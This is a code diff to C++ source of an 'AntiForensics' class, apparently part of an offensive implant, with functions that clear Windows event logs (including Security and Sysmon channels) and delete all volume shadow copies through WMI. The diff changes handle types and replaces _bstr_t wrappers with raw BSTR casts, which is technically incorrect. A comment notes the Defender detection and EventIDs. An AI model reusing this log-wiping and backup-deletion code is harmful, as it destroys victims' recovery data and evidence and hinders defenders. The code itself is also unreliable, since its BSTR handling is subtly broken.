@@ -28,9 +28,8 @@ std::string AntiForensics::ClearEventLogs() {
     for (auto ch : kPriorityChannels) {
         // Detection: EvtClearLog on Security/Sysmon channels from a non-system process
         // triggers an immediate Windows Defender alert and appears as EventID 1102 / 104.
-        EVT_HANDLE hLog = EvtClearLog(NULL, ch, NULL, 0);
+        BOOL hLog = EvtClearLog(NULL, ch, NULL, 0);
         if (hLog) {
-            EvtClose(hLog);
             ++cleared;
             // Convert to narrow for result string
             int len = WideCharToMultiByte(CP_UTF8, 0, ch, -1, nullptr, 0, nullptr, nullptr);
@@ -48,9 +47,8 @@ std::string AntiForensics::ClearEventLogs() {
         wchar_t chBuf[512] = {};
         DWORD chLen = 0;
         while (EvtNextChannelPath(hEnum, 512, chBuf, &chLen)) {
-            EVT_HANDLE hLog = EvtClearLog(NULL, chBuf, NULL, 0);
+            BOOL hLog = EvtClearLog(NULL, chBuf, NULL, 0);
             if (hLog) {
-                EvtClose(hLog);
                 ++cleared;
             } else {
                 ++failed;
@@ -83,7 +81,7 @@ std::string AntiForensics::DeleteShadowCopies() {
 
     IWbemServices* pSvc = nullptr;
     hr = pLoc->ConnectServer(
-        _bstr_t(L"ROOT\\CIMV2"), NULL, NULL, NULL, 0, NULL, NULL, &pSvc);
+        (BSTR)L"ROOT\\CIMV2", NULL, NULL, NULL, 0, NULL, NULL, &pSvc);
     pLoc->Release();
     if (FAILED(hr)) {
         if (ownCom) CoUninitialize();
@@ -95,8 +93,8 @@ std::string AntiForensics::DeleteShadowCopies() {
 
     IEnumWbemClassObject* pEnum = nullptr;
     hr = pSvc->ExecQuery(
-        _bstr_t(L"WQL"),
-        _bstr_t(L"SELECT * FROM Win32_ShadowCopy"),
+        (BSTR)L"WQL",
+        (BSTR)L"SELECT * FROM Win32_ShadowCopy",
         WBEM_FLAG_FORWARD_ONLY | WBEM_FLAG_RETURN_IMMEDIATELY,
         NULL, &pEnum);
 
@@ -117,7 +115,7 @@ std::string AntiForensics::DeleteShadowCopies() {
             vtPath.vt == VT_BSTR) {
             // ExecMethod on the object path with the "Delete" method
             hr = pSvc->ExecMethod(vtPath.bstrVal,
-                                  _bstr_t(L"Delete"),
+                                  (BSTR)L"Delete",
                                   0, NULL, NULL, NULL, NULL);
             if (SUCCEEDED(hr)) ++deleted;
         }
